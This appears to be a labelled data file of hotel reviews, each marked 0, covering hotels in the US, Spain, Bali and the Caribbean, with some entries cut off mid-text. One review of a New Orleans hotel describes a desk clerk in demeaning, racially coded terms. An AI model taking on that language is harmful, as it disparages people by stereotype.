facilities more accessible, we would probably stay again due to the location.",0
"A top choice in Barcelona I spent two nights at the Casa Fuster from 26-28 November. I had spent two nights at the Hotel 1898 on Las Ramblas before checking in to the CF, and although a night in a Standard room at the CF was 110 Euro a night more expensive than a Superior room at the 1898, the CF truly is in a different class than the 1898 and is worth the extra money.I should say however that a local travel agent quoted me a rate of Euro 240/night inclusive of breakfast at the CF for the weekend of November 17th, but I ended up having to change my travel ",0

"loved staying at the tuscan we stayed at the tuscan for 7 days and truly enjoyed ourselves. the front desk was very helpful as was the rest of the staff. the rooms were very nice, could of use just a little more shelf space by the bathroom sink. loved the beds, very very comfortable. the location was perfect, we could go anywhere and still feel close. i would go back without a doubt. thank you for making our stay very comfortable.",0

"buyers beware! i just returned from my 5 night stay at the occidental grand and i cannot begin to tell you all the things that went wrong. at first i thought that maybe we were too spoiled and it was just us, but as we met more people we heard all of the same complaints. i never met so many people that couldn't wait to go home.checking in--it takes forever!! honestly it makes standing in line for the dmv seem like a walk in the park. there was a huge line of people when we got there and all you see is about 5 people working behind the desk that are walking around aimlessly. one guys was straightening papers on the back table anther guy was must have walked in the back room like 10 times just to come back with the key to the room. and if someone comes over to complain about a problem they are having with their room (which happens often) all 5 crowd around to take care of the problem leaving the rest of us high and dry. rooms--extremeley out",0

"great family resort we recently stayed at the hilton on our spring break. overall, we had a fantastic stay. we were upgraded from a regular room to a casita (because of my hilton honors status), and those are very nice. we are a family of four and it was great not to be bumping into each other constantly, with two bathrooms available. we even had a private pool tucked in between a couple of buildings, which provided a nice break from the noisier river ranch area.the grounds are nice, and we found the staff to be very pleasant and helpful. the concierge personnel were great - very helpful with suggestions that always worked out well. they had cards for all of the suggested locations with addresses and directions printed out - very convenient. a fault in the hotel which was pointed out earlier is the lack of a safe in the rooms. hotel management really needs to ask temselves where they expect the families to leave their wallets and devices when they leave their room in the morning to spend the day at the pool.the breakfast buffets that are offered at both of the onsite restaurants are very average. no made to order omlettes or waffles that are often available at other hilton resorts. in addition, the ice cream/candy/snack shop that was onsite closed at 7 pm! unbelievable that it wouldn't be open later during this time of year.overall, the family had a great time and i would definetly return.",0

"Too Relaxing - Did not make me feel special - BORING How do I begin...Bad, no it wasn't too bad, frankly it is a beautiful place, Let me list the pros and the cons...if you are going soon, read, this is a very HONEST opinion , with no exagerations..truly1. Rooms - Excellent - Big enough, modern flat screen TV. If traveling with family (adolescant, teens) you might want to ask for rooms with privacy, the bath area is open leaving you literally no where to change clothes when you want to change, or to get dressed after a shower. It was fine for us, it was just my hubby and me. The elevator are not air conditioned so you will roast in there and the bldg on the left as you look the beach, those elevators never worked. My friends had to be moved to a ground floor due she is very pregnant and could not climb stairs.2. Mosquitos, yes, quite a few, my hubby never got bit, but I did. They do spray, you can smell it in the evenings when they spray. But first day I was eaten alive, I learned , every time I took a shower I put Avon Skin so soft - bug repellent cream, and that did the trick ! No more bites ! Not one...they were in the room but stayed away from us !3. Internet - Great Service - Nelson the internet/business office guy was awesome young guy. You buy internet for your laptop and you have wireless WIFI in your room or pool area, for 25 dollars you get 25 hours, you can break up the hours, so we had internet all week, it was awesome, stayed in touch with the kids.And we used SKYPE to call home for 2 cents a min, awesome !We took a headphone, laptop and talked away on skype.com.4. Beach - AWESOME beach, no chair games, plenty of chairs and huts to pick from. The front ones were usually taken by early birds, but there were 2nd row plenty of them. Nice huts and chairs and beach was awesome. Activities on beach, was 15 dollars for bannana boat ride (too much !!) The vendors on the beach were annoying, altough the police did a good job of keeping them away, a distance, the minute you walked over the line they swarmed you.5. Pool - was nice...6. Bar service - lacked big time, not that friendly, although Ramonfrom the VIP bar on the right as you face the beach is awesome. He will accomo",0

"don't believe all the reviews !! my husband and i stayed at this hotel pre- and post-cruise. i read some reviews of the hotel after we had booked and wondered just what kind of place we were going to, because some of the reviews were pretty awful. i must say that our experience was just great !yes, it does have a small lobby, but it is clean and comfortable and the staff, while young, went out of their way to make us comfortable and get us in a room as quickly as they could. our rooms were very clean and we had no problems with noise or disturbances from other guests.my husband accidentally left our entire camera case in the taxi that took us to the hotel and three different shifts of desk clerks made calls on our behalf trying to get it back for us. i am pleased to say that a wonderful cab driver brought it to us on his day off and got it to us with just minutes to spare before we left for the pier.yes, the hotel is in a somewhat transitional neighborhood, but no one bothered us and if you want a great breakfast (at any time of the day) take a minute and walk about a block to the hurricane cafe. they have great food at pretty reasonable prices.i would stay at this hotel again.",0

"wonderful hotel! we stayed at the chelsea lodge for 6 nights in june this summer. it was our first trip to new york. it was a lovely small hotel with nice country-like rooms. the rooms were always clean and tidy. the staff was nice. once in the hotel it was very quiet and peaceful, even though it lays in the center of manhatan. it felt like you were'nt in the city anymore. which was a good feeling after a hectic day in new york. the rooms were also very cheap. it was a very pleasent excperience!",0

"hotel royal--a disappointment i have stayed at many moderately priced hotels in the french quarter, new orleans. i have never complained about any of them. this is a first, for me. hotel royal is a small hotel that is a few blocks back from the action on bourbon street, so i thought it would be sort of quiet. now, i know it was mardi gras, and i was prepared for noise and late-night comings and goings. that said, there are wood floors in this place and you can hear everything that goes on above you, and beside you. i could hear the man next door pass gas. okay? i was awakened by the sounds of people breathing hard after having to walk up that long flight of stairs from ground floor to second floor--no elevator, which is not uncommon in new orleans. the courtyard was pretty, but not when guests put their boom box in their doorway and proceed to wake the dead--because we all faced the courtyard. the mattress was from hell. why? because there were no chairs in the room, so everyone must sit on the bed. if i needed light, i had to get up and go to the light switch by the entry door because there were no lamps in the room. and to top it off, when i went to the front desk one evening to ask for a wake up call, the ghetto-fabulous female at the desk was too busy talking to her homegirl to put her on hold to talk to a pesky customer. so i waited. and waited. and waited. i asked if the wake up service is reliable and she spat out: i don't know, i don't work morning shift! how encouraging! managment: how can you afford to hire these females with the corn-chip fingernails who really could not be bothered with their jobs or your guests? and, if you're over 100 lbs, forget about fitting into the bathroom--the toilet stall is as wide as the average person's hips. don't stay here! try hotel st marie, bourbon orleans, french market inn. sorry, management, but this place was terrible.",0
"great place for a family just returned from a stay this past week. there were two of us traveling with our three year old daughter. our suite was remodeled, and very spacious. my husband likes to stay up late watching television, so we were able to close off the bedroom and sleep without being disturbed by the tv. there was an enormous line at check-in, but the man who checked us in was very friendly and apologized for the wait. overall, i would say that the staff was very friendly.room service was lacking, and i would not recommend spending the money on it. there are two places to eat at the river ranch, which were both good, if a bit overpriced. beware the extremely high prices for drinks. previous reviewers have mentioned the crowding at the river ranch. i would have to agree with them. it appears that people stake out chairs early in the morning, then come and go throughout the day, leaving few to no chairs available. we were able to find chairs by going to the pool in the early evening and staying until they closed. with the 115+ degree heat that phoenix was experiencing, it worked out well for us not to be out there in the hottest part of the day, anyway. overall, i would recommend this property to families, due to the activities and the size of the rooms.",0

"comfortable but older the sheraton crescent was a fine hotel but there are some things you should be aware of before deciding to book there. the hotel is much older than it appears on the website. if this is an issue for you then don't stay here. i should also note that my experience with club level perks in other hotels have been far better than at the sheraton crescent. the alcohol is not free (about $4.50 for a domestic beer) and the evening hour'dourves were nothing to get excited about (cheese cubes, veggies, chips and salsa, etc.). unless you like being on club level for other reasons than the lounge i would not spend the extra money here. i would also like to note that i stayed in a jr. suite and requested a king size bed. it was not a king size bed, it was a queen that folded out of the wall, comfortable but not what i had in mind. finally, i called concierge for a recommendation on where to eat in downtown phoenix. i was then transferred to someone else that informed me that he is not from phoenix and was not familiar with downtown. i asked if he could find someone that was and was told he would call me back. i never heard from him. in my past experiences that is what concierge is for, they even make reservations for you. checking in was a breeze and the rooms were clean. i would recommend this hotel for a couple of nights stay if you are looking for a reasonably priced hotel but not a luxury hotel. again, the website can be a little deceiving when it comes to the appearance of the hotel. it wasné¥?? a disaster but disappointing when you get there and nothing seems to be the way it was presented to you. hope this helps in making your decision on where to stay in phoenix.",0

"a good place for san francisco newbies just back from four pleasant nights at the tuscan inn. some folks might be put off by this hotel's best western affiliation. don't be. this is a real hotel, not some plastic motel at an interstate exit. i'd recommend this property, especially to first-time san francisco visitors. it's modern, clean, efficient, comfortable, and professionally run with courteous staff. on your second visit you might opt to stay a greater distance away from the tourist schlock of fisherman's wharf. (the hotel is about 2 blocks south of all the buzz on the wharf, so don't worry about hordes of tourists lurking about.) or, like me, if you've been to the city several times, you might choose to stay here because it is so close to transportation: a bus stop is right across the street; one cable car turnaround is literally around the corner and another is a few blocks away, and the pier 41 ferries are a 5-minute walk away, as is a streetcar line. (you know all those warnings not to drive in sf? pay attention! don't drive. you'll be having fun while some other poor sod is looking for a parking space that isn't there.)although i didn't notice much of an authentic tuscan note, my queen bed room was europeanly small. not cramped or inaccessible, just compact. (i had a glimpse at a king room, which was larger. more later.) the bed was comfortable, the closet and storage space was sufficient for one or two people traveling light, and the bath was not cramped. if there are two of you and several bags, plan on stacking most of the bags in a corner of the room.the room had a few annoying decorative items -- like a four-foot long round pillow carefully placed at the same location on the bed by the maid every day -- that seemed spawned by a marketing maven. apparently, all the rooms are similarly afflicted. oh yeah, if you don't like mirrors, go elsewhere. one entire wall is covered with mirrors.the restaurant on the premises is the cafe pescatore. breakfast there was fine, but i ate elsewhere for lunch and dinner. the cafe is comfortable and service was attentive and polite. plan on spending $15-$20 on breakfast.room service at the hotel is limited: breakfast items from the cafe and lunch or dinner from a neighboring pizza joint, but, hey, this is san francisco. why are you eating in your room?the hotel provides complementary coffee and biscotti in the morning and hosts a winetasting in the late afternoon, if you forget something, a walgreen's, a safeway and a trader joe's are each about a block away. a large barnes and noble bookstore is even closer, if you're in need of caffeine and a book to read on the flight home. the rest of the immediate neighborhood seemed safe and nondescript, and largely free of the homeless and the street people that are in evidence elsewhere in this costly city.other's have urged requesting an interior room overlooking the courtyard. they're right. streets in the neighborhood carry a lot of traffic, and rooms on the streetside might be too noisy for your tastes. (this isn't unique. traffic is heavy almost everywhere in sf.) i'd booked an interior courtyard room with a king bed, calling the day before i arrived to reiterate the request. however, i was given a streetside room and i could hear the noise before i unlocked the door. after complaining back at the desk, i was switched to a quiet queen room overlooking the courtyard.",0
"how did this place ever get 4 stars?! i've stayed in lots of 4 star hotels around the world and have stayed in other 4 star hotels in barcelona and by comparison the pere iv is terrible. it was booked for me as i am on a business trip.last night and this morning i barely slept at all because it was so noisy. the floors in the rooms are not carpeted and because it is an old hotel there is little or no sound proofing between the floors and as a result when someone walks across the room above you it sounds like thunder and if someone drops something your room practically shakes. there is also no sound proofing between rooms and i was woken up in the morning by the room next door playing dance music. whilst i did stay on a saturday night the noise i experienced cannot be attributed to the day of the week because i was disturbed by the kind of everyday noises of people moving around.the rooms are very small, the bed covers are not nice and the complimentary soaps etc are cheap. our room looks out into an internal atrium so has no view. i suspect 50% of the rooms share this outlook. as well as having no view, the atrium is very noisy because any noise in it echoes and bounces off all four walls. nothing is what you would expect from a 4 star hotel.the decor is horrible despite what other reviewers have said. who in their right mind would paint the walls orange and fit a red carpet? it is very",0

"mmmmmmm when you take a look around new york and see what else is on offer in the $80-110 price range, you can appreciate why the chelsea lodge is booked up fairly fast.for the price ($105 +tax) for a double room, it's a bargain...the ambience of the hotel is very pleasant, with a sort of rustic country decor to it. the rooms are pretty small, but if you've come to new york you'd have to be pretty dull to spend too much time there anyway. the shower cubicle and basin do the job just fine, and the communal toilets are very clean and just outside the rooms. however it's the location that really clinches it. located in the chelsea district, the traditional brownstone flat front terrace is in a perfect position to explore what the city has to offer. the subway (23rd or 14th st stations) is close at hand, but it's so easy to walk everywhere you won't often need it. times square, macy's, the empire state building and the rest of midtown ny are just a 20 minute walk, and the bars and restaurants of greenwich village and soho are a similar distance away. chelsea itself has an excellen range of bars and restuarants for whatever budget or taste. among others, the nooch thai/japanese noodle bar, market cafe and empire diner - both trendy diners - and cafeteria (bar/restaurant) were all pretty tasty.",0

"good for pre-cruise my husband and i stayed at the holiday inn at the port, pre cruise, on jan. 1. we arrived around 1:00 p.m and when i requested a port view, she said we were upgraded to a suite. nice. we had a separate bedrom ,living room and small kitchen area with micro, frig, sink etc. it ws nice to have the extra room but since it was just a one night stay, not necessary. it was clean and very quiet. considering they were full, amazingly so. we were given a free buffet breakfast too, which was average. filling. being right across from bayside was nice, as we spent the afternoon and early eveing watching all the activities. there is a liquor store nearby so we were able to get a few bottles of wine for the cruise. (we cruised on oceania which allows you to carry on whatever you want. ) the front desk was helpful and the trip to the port was only ten dollars. a decent hotel pre cruise. nothing real fancy but location is what sells it. we'd stay there again for the convenience.",0

"pay for it! we stayed at the hilton as it was near to universal studios with our 5 year old. the hilton was the last of the 4 hotels we stayed at during our 2 week trip to the us west coast, so we are comparing our hotels .... even though we had an executive room, i was surprised that we had to pay for internet. sneakily the computers were located in the business area on the ground floor and we were not able to access the computer in the executive lounge.likewise drinks during cocktail hour were not complimentary as it had been at other hotels during our trip to the us.the room was large, but our twin beds were the smallest we had slept in during this trip.the bathroom products were however one of the best we had.there is a shuttle service between the hilton, universal walk and the sheraton which was handy as it's on a side of a hill and a bit of a struggle to walk it.it's clean, on the glamour side, nice restaurant, the closest to universal studios, however if i wasn't booking it due to its close proximity to universal, i would not have stayed here.",0
"best one star rated hotel in my book! a one star rating, someone needs to look at that! this place for a family, etc. is the best! spacious rooms and the location is perfect! went with my family a 6 in one suite, plenty of room hubby and i even had a seperate bedroom, clean kitchen for cooking, pool!! you really couldn;t ask for more! their staff was more then accomadating, my suburban fit in their 6'4 garage, which we thought it wouldnt, so parking big plus! theres a huge mall right out the front door, i can't say enough and i was so nervous because we didn't know area and the one star rating, go for it!!! just skip the tours of famous peoples houses, rip off - all you see is bushes!! and the bushes are 15feet high! save your $$$! thanks orchid, we'll be back for sure!!!",0

"could be better we stayed here again enroute to the us mainly because of proximity to the airport and it was pretty good when we stayed here last year. we booked a suite for $20 more so we had more room. it is not a cheap hotel in our view so look for good deals. the king bed was very comfortable but there was no bed for the two teenagers. the queen bed advertised turned out to be a sofa bed which we had to ask to be made up. quite frankly, if i were the hotel manager i would have been embarrassed by the dilapi",0

OK but won't be staying there again The good deal we obtained via the hotel's website went out the window when we upgraded to a Business Class room at check in (paying another 50% on top of the original price) because we were told we would have to do this if we wanted a baby bed in the room. The baby bed they then provided had no proper base and could not be used. This was not rectified when we informed reception after the first night. The room was clean and still had a new feel (nothing worn yet) but the colouring scheme (lots of greys) made it feel cold and it had a retro 70s look. TV and film info in the room were a month out of ,0

"wonderful! we loved every second of our five-day stay at the royal palms resort spa. the grounds were beautiful- well maintained and had a tropical feel. the pool is small- not great for laps, but wonderful for floating. i think the smallish number of chairs might be a problem when the hotel is fuller than it probably was when we were there. the umbrellas are huge and offered a lot of shade, but if you wanted sun you could have it (do you want to sit in the sun in 105 degree heat?). we stayed in room 138, which had the world's most comfortable bed, a nice sitting area, a flat-screen television with standard cable, a private area outside and a newly redone bathroom. housekeeping kept the rooms spotless. we enjoyed turndown service every night and looked forward to cards and candies we would find. the restaurant is good, but expensive. you can eat at the lounge, where entrees range in price from about $14 to about $40. if you do, definitely try the tempura asparagus- it was a highlight! there is a $22 daily gratuity fee attached to your nightly stay, and it is totally worth it. i cannot stress enough how attentive the staff is. when we called for our car, the men actually ran to get it to us faster. the concierge was wonderful, and when we did have a mix-up with a resort activity we had signed up for but wasn't offered, they bent over backwards to make it up to us. we would love to return!",0

"Had a great time, minus the little problems. We stayed at the Bahia Principe Nov. 7 -14. It was a very much anticipated trip and was fantastic minus a few problems. I will try and give as much detail as possible, because these reviews really helped me so much, so perhaps I may help someone else.The airport was a breeze. I was really impressed by how quickly they seemed to manage everything. Especially for it being so small. The bus ride to the hotel was quite bumpy and I had a huge headache and felt a bit sick by the time I got to my hotel.I felt much better as we unloaded into the lobby of the hotel. It was BEAUTIFUL! Everything is made of tile and marble, with these great sculptures and beautiful paintings. Everyone at the front desk was smiling and is definately alot slower than I am used to here in Chicago. We paid the $35 for the safe for the week and they wanted cash, I found it strange that they told me they don't accept credit cards for incidentals and such. So just be prepared for using cash there. AFter we received our keys we had a bellman take us to our room on this cart thing and he helped us carry our luggage upstairs. The grounds are exquisit and perfectly manicured. And each building of villas looks like a postcard. Our building was #14 and we were on the second floor overlooking both pools in the middle of the property. I would have to say we were in the perfect location. We could walk to the lobby or the beach with about a 5 minute walk either way. Or you could walk right downstairs and catch a tram that was always running up and down the paths.Our room was stunning. I really didn't expect it to be so nice. 2 big beds and a couch. A table and chairs, mini fridge, patio with table and chairs (which had the most amazing view). Our mini fridge never seemed to get cold, which was a bummer cause I had to bring antibiotics for my son that were supposed to be kept cold. Our bathroom was big as well. Nice size jacuzzi tub, with this 1/2 wall of glass. Everything is stone, tile and marble. I know what everyone is speaking of now in these other reviews about how the bathroom gets so wet. Just be careful getting out of the tub/shower cause you can easily slip and fall.Our maid seemed rather accomodating. We left a few dollars each day and a note if we needed anything and it was always waiting for us ASAP. There was one day we were in the room alot so she never had a chance to come and clean and stock our drinks, so I had to phone down for water. I phoned 4 times and no water ever came that day. ( Good thing I had set a couple aside.)Eddie the Funjet rep. was so nice and helpful. He gave us a good piece of advice...if you are to drink 151 rum, write your room number on your hand so people will know where you belong Caution: 151 rum can do you in very quickly. LOLOur first full day we were there we went to the shopping center since it was raining a bit. Another caution: Since everything is made of marble, floors are extremely slippery!!! I did fall down 3 stairs and have the biggest bruise on my rear end that anyone has ever seen. The shopping center is very cute. I liked that all the little shops were right there for anything you may need. I had alot of people tell us that the flea market on the beach wasn't worth going to, so we stayed at the resort. I felt they had fair prices for what I got, but feel free to barter with them as well.We never went to the disco or the casino, since we had our 6 year old with us. The disco didn't open until midnight anyway.The mini club was fantastic. Isabel is so sweet, she kept my son so entertained. He actually would rather go there then hang out at the pool with us. They did mini golf, games, video games, beach games...tons of activities. Now the food....I thought it was very good. I took pepto morning and night everyday no matter what and I had no troubles. The buffet in the lobby had so much to offer it was unreal. You could try so many thing you will never try again and they had the old standby's like pizza and pasta. They had these 2 dishes that were Dominican that I thought was the best food of the whole trip...Yuca (mashed) and Mambu (I think that is the name). Yummy! We had our choice of 3 ALA Cartes. So we chose:Mexican - Holy Cow! This was the fanciest mexican rest. I have ever been to. They bring you a margarita as sson as you sit down, with some chips and salsa. There are about 5 things to choose from on the menu. We had beef fajitas and chicken tacos. Then they tell you to go up to this buffet for soup and salad. I can't even begin to tell you the assortment of food that was up there. My husband kept saying this isn't right, why did we order from a menu? There was so much terrific food.Japanese - Incredible! You are first brought sushi, which I had never had. I tried it and it was good, except for the ones that looked a little scary. Then you got a tempura which was out of this world. Then soup. Then the chef cooks up fried rice, veggies, and different types meat. Every thing was unreal. You are treated like royalty there. After your meal you are escorted to some intimate tables for your dessert. I thought that was very cozy.Steakhouse- Service was horrible. We waited 40 minutes just to get drinks. Everything seemed very disorganized there. The food was good regardless. I had a BBQ Beef Brisket. The beef there is very different than what we are used to in the states, but I am not too picky, but know good food also.During the day we would mostly eat at the snack bar by the main pool. They always had fruit, salad, burgers, chicken, hot dogs, pizza, french fries, and ham and cheese. The food was ok here, nothing outstanding.I have to say a few things about the Dominican people....They are the friendliest people I have ever met. They are very hard workers and do their best to accommo",0

great stay in san fran great place to stay - very clean and confortable rooms and helpful staff. added touches like the evening wine reception and morning coffee in the lobby add to the experience. some people have said it is a long walk to some places such as the ferry and bridge but it is a large city and you can't be close to everywhere! the walk to the city centre shops was about 20 mins but there were different ways to go to see different places along the way such as china town and the italia areas. close to the wharf which is a great place to visit in the evening and seemed to be a safer area than a lot in the city. we stayed over new year and it was close to good viewing spot for the fireworks. i would recommend this hotel as a good base for a short break to san fran - the hotel rooms weren't the biggest so a longer stay might not be as enjoyable,0

"excellent overnight stop in la we needed to overnight at a hotel near lax on the way back to florida from a lengthy stay in australia and new zealand. we booked the renaissance montura on the basis of its location (convenient to lax by free shuttle) good price and favorable reviews. we were not disappointed. we arrived in early afternoon after a 10 hour overnight flight and were checked in in no more than 30 seconds. after an afternoon nap and swim, we had a light meal in the restaurant where the service was friendly and efficient. the room was clean and the elevator service speedy, even though the hotel was full.i would definitely stay here again. the renaissance montura provided a hassle free experience which was just what we needed after an exhausting overnight flight.",0

"newly renovated. great for this class of hotels this hotel offered preferred rates for a student conference at harvard. we picked it because it was the cheapest and permitted four students in one room and free parking without extra charges. the positive: one block walk to the t subway system on the boston college line. very nice continental breakfast with fresh bagels, muffins, hard boiled egges etc and made to order waffles. the rooms are being renovated and all three of ours were renovated. i have to say the pillows and mattresses were new comfortable and the rooms completely quiet -- i hate traffic sounds. the neighborhood behind it is up and coming, decent for a walk. near to newton and boston college. small efficiency kitchen with a fridge, microwave and dishes was handy. the desk staff were extremely helpful. free wireless access and a free pc in the lobby for internet access. negative: given that i was not expecting a resort, i really have nothing negative other than we were awoken at 8am on monday morning by the rehab of a nearby room. my call to the front desk brought an apology and i was told they were not expecting the workers until 9:30am and had already asked them to stop...which they did. the other negative is that the property is a little out of the way for the main boston sights, about a 30 minute subway ride to government center (a major depot for all lines) and about 50-60 minutes from the airport. for harvard, the desk staff advised that we take the t four stops and switch to the 66 busline which took us right into harvard square.. a half hour in total. otherwise, the t alone would have taken about an hour. i highly recommend the mulit-day passes. our 7 day pass (covers trains and buses) for $15.00 was a good buy, considering the one way tickets on the t are $2.00. use it to commute all over the city and to the airport. cannot be bought at the airport but take the free shuttle to the subway and bye it there from the ticket machines.",0

"definitely a good deal! i named my price of $39 on priceline and it was accepted. i found out afterward the hotel would be the radisson phoenix airport on university blvd. some of the reviews were bad, but i figured for the price it couldn't be that bad. my young son and i were traveling to phoenix for a family get-together and just needed a hotel room for one night. we arrived late during a raging monsoon storm! yikes! when we got to the radisson, the night desk clerk (a man) did not look up from his computer screen for what seemed like a long time. i was standing right across from him! finally he looked up and said do you need something? uh.... yeah... how about to check in? duh. after that he was fine. we requested a 2pm checkout (normal is 12 noon) and he said it wouldn't be a problem. we got a room with a king sleep-number bed. we got into the hotel room and tried out the bed. as i tried to lower the number on my side of the bed (with the remote) the thing completely deflated! it was flat as a pancake and wouldn't respond to the remote any longer. but after calling down to the desk we were moved to another room (on the executive level - 6). you need a 6th floor key card for the elevator to even go up to that level. that seemed cool and a little more safe. for $39 bucks you can't beat that. the new room was the same layout, not sure why it's executive but whatever. the bed worked great and all was well.the disappointments were: no fridge and no microwave. those would have helped.the room was clean, the bathroom was clean and nice. i didn't see a problem. they give you a little card to fill out and hang on your door to order room service breakfast (needs to be on door by 1 am), which we did, and it was delivered promptly when we indicated the next morning. they forgot our toast but i called and they brought it right up. it was marginally good. it was nice not to have to get up and shower, get dressed, etc. just to go have breakfast. we were tired.we went swimming later in the pool. no one was out there except one other guest. it was nice. then we checked out. it took quite a long time being that there was only one desk clerk and two people in front of me. the clerk was very professional and good. she was a woman with a foreign accent - pakistan or the like. i think her name was venetia. very good.the location was good - easy to get to and convenient. the neighborhood is fine - i didn't understand why some people felt unsafe there.overall i am very pleased with the radisson. my sister paid full rate and wasn't quite as pleased (i can understand that!) but for what i paid, it was very nice.",0

"terrible in tuscany we had been traveling quite a bit this summer. we were in calfornia for about 15 years in a row,for almost two weeks. we used to stay in downtown san francisco , then found a nice small motel place near the wharf, but the mattresses became too lumpy for our backs. so, we were up in calistoga(wine country) and needed a short two night stay before we headed home. i had read reviews of the tuscan inn in prior years and thought it would be a good choice. we were severely disappointed. the hotel manager did her best to help us, but certain problems with the hotel simply can not be corrected. the rooms that face the streets are very noisy due to tour buses, local buses and traffic. the courtyard room we were assigned was dark and dingy and since we are fresh air oriented, when we opened the windows we heard 30 +air conditioning units humming away. couryard rooms are darker than street rooms. the interior of the room was sort of rococo with a mishmash of colors. the room itself was small and crowded with old furniture and knick knacks. the bathroom had several problems. first ,it was tiny ,old and not at all modern. when i woke up early in the morning to use the facilities, a light outside on the vanity wakened my traveling companion.the inn advertises coffee and tea and biscotti in the morning. regrettablyt, the biscotti were tiny pieces, quite inedible.the lobby is very busy, with lots of tourists rushing around, apparently quite a few on bus tours. we think the hotel needs a major redoing in almost every respect.before we reserved, we asked the front desk about the mattresses and were told they were new. my side had that typical depression you find in a hotel bed where a person has been sleeping on the edge and the mattresses have not been turned or simply were not of good quaity to retain any support. we later in the day checked out several large chain hotels in the area, and found them not more expensive and just in more fantastic shape. so, we will never stay at this inn again, barring major renovations.we advise travelers not to be impressed with what the hotel sounds like, and to pass it by.",0

"great view, but don't bring your car. booking the hotel was very easy. the good things about the hotel are it's close proximity to bayside, the american airlines arena, and bicentennial park for the ultra festival. both were in very easy walking distance. if you are lucky to get a hotel room high enough and facing the street and the bay the view is wonderful. the worst thing about the hotel is not enough parking! had i known that there were only about 30 places to park and that we would be charged $12 a day to park there, i would not have rented a car. when the when the lot is full the security staff and front desk are absolutely no help and couldn't care less what you do. you are supposed to park in a larger lot next door, and pay the lot people directly. you do need to let the staff know that you are parked there so you can be reimbursed for that night. however, if there is a special event going on in that area (in our case, a miami heat game) the parking fee for the lot next door (which is normally $12) shoots up to $40!!! there are a few parking ramps in close proximity, and meters out in front of the hotel, but you may not park there overnight. the staff is very aloof as well.",0

"don't stay at the roosevelt!!!!!!!! the bell person, elmo, who was the best part of the stay because of his courtesy, assured me that the hotel had spent in excess of $30m on renovations. i could not understand where this money had been spent. i have stayed in better motel 6 rooms. i may have been spoiled after just spending several nights at the westgate in san diego before checking into this hotel. by the way, when in san diego, stay at the westgate--very classy with very courteous and attentive staff. back to the roosevelt--save your money and time. there are numerous other hotels within walking distance that appear to be much better. i was completely disappointed and disillusioned by my stay. stay away!!!! the roosevelt is a dump!!!!!",0

"just ok ok hotel,very small and tight room, nice lobby and good location if you want to be by all the tourists that get drawn to the wharf, the best part of the hotel- the restaurant downstairs on the corner, a little pricey but good breakfeasts and dinners. if you want to be more center city, check out other locations in a different area. oh yeah - bring a sweatshirt sweater and warm jacket, it was pretty cold, something i would never expect for california but mark twain was right and according to our bus driver the best time to visit is in sept/ oct, when all the fog burns off and you can see the beautiful sun",0

"historic my husband and i attend professional conferences with the kids in tow. this is always problematic when it comes to lodging. the kids need to go to bed earlier than we do, and we need to be able to catch up on email and reading session descriptions for the next day. so we have all the needs of a business traveler (high-speed internet, adept service) as well as the needs of a family (relative quiet, extra towels, easy access). we don't need luxury, just a good, clean place to land.the herbert fit this bill nicely, for a decent price. our conference hotel would have cost us nearly $600/night for two adjoining rooms: at the herbert, we had three adjoining rooms for $285. yes, the rooms were small, the floors were uneven, and there was a broken tile in the bathroom, but the decor was ikea-cheerful (not business bland), the beds were comfortable (we much prefer comforters to polyester blankets), the bathroom was spotless (with hexagonal white tile) and the windows actually opened for fresh air. the internet access was good and fast, but we did have problems trying to connect in one of the three rooms: the phone was dead in that room as well, and although staff was attentive and knew what we were talking about, they were unable to get that line working. note that the internet connection is not wireless, but a cat5 cable that you plug in.noise is always an issue when staying downtown, but other than the halloween party noise our first night, it was relatively peaceful--for a downtown location. the dinging of the cable cars--right outside the door was a pleasant reminder of where we were. location was what really sold us. we were a block off market street, the main thoroughfare for public transport, with cable cars, muni, and bart all right there. you can buy a muni pass there as well, and it will pay for itself in short order. go up the street in the other direction, and you're in union square, with its great shopping.i would recommend this hotel, especially if you need an extra room or two and are on a budget. this is a historic building: if you want new and shiny, go elsewhere. if you like character, this is the place.",0

"roaches were everywhere inna kuta resort has some of the most beautiful grounds on kuta beach, the hotel has direct beach front access and the staff there are very friendly and responsive to your needs. however, we stayed there and found the hotel rooms to be in very a very poor state. the main problems with our rooms were cock roaches. we stayed in a standard room with a king size bed and the first night we had more then 7 cock roaches in our room, two of them were located in the bathroom while the ret were in the main room.the staff did come in a sprey with a normal bug killer bought at any store, however the roaches were still there later that night. they moved us in to a suite the next day and then two days later we found cock roaches in our bed.when we were checking out we did thank the staff and tell me we had a great time except for the roaches, however the reception person denied there was any problems in the hotel with roaches. this would be fine except that our mother's room also had roaches and the day before we checked out and the day we checked out we found several hotel staff going around the rooms spreying for cock roaches. also we heard another guest complain to the desk about 5 minutes before we did about the roaches also.the hotel is in a great location, the pool, the grounds and the resort itself are all very beautiful and nice, the rooms need to be redone and brought more up to",0

"very good value for what we paid we booked this through hotwire and got a great deal at just over 200 for three nights. we had a two-double bed room. the room and hall were a little stuffy when we first arrived but other than that the room was clean and very comfortable. the carpet could have used some cleaning so make sure to wear slippers or socks when walking around. the beds are comfortable -- no back aches, etc. when we woke up. the bathroom is a little small but i've seen worse. they supply a hairdryer, shampoo, conditioner, soap, shower cap and mouthwash. the refrigerator that is in the room is filled with drinks and snacks that you have to pay for and it is locked. you have to ask for the key from the front desk. if you need a fridge for your own personal things then you need to ask for one to be brought up because there is absolutely no room for anything. the coffee kiosk located downstairs in the mornings is not always a sure fire thing. two of the three mornings, there was no one tending it and there is no self serve option. you also have to pay for the coffee you get at the downstairs kiosk. so you might be better off making sure you have coffee in your room.the room was pretty quiet. the only area for improvement could be the noise from the hallway. our room faced the hohokam highway but it was quiet too. there are several other hotels in the area but nothing to walk to for restaurants. you are better off getting back onto university drive and heading a bit east into tempe where you will find lots of spots to hit.",0

"good location, servicable, but stayed at the hotel royal for mardi gras, 2004. had some reservations staying here after reading the reviews, but decided to try it anyway, since i had already paid for the stay. a great location in the french quarter, but i have some problems with the place. nothin near as bad as some of these reviews make it sound, but note-worthy.here's the low-down: the hotel is a converted set of houses bunched around a central courtyard. nice fountain. the room i stayed in was a junior suite and appeared recently rennovated. no carpet on the floor, but otherwise clean. the bathroom was nice but there was little water pressure. furniture was sparse. just a bed, 3 tables, and bench at the foot of the bed. no dresser, but there were some shelves in the closet. i poked my head in some of the other rooms nearby as they were being cleand and they all looked similar. i was in a third floor room in the front part of the hotel, so i don't know what the rooms in the back were like. also, there was no elevator so the walk up got a little old after a while. i know it was mardi gras, but it seemed the rooms weren't well sound proofed to other interior room. i frequently could here entire conversations.housekeeping was typical hotel staff, not very social, but they did their job, if a little too loudly early in the morning. we did get new towels every day but one and when i called to get more, was told that the maids had given out the correct number of towels. didn't know what that meant and had to make do 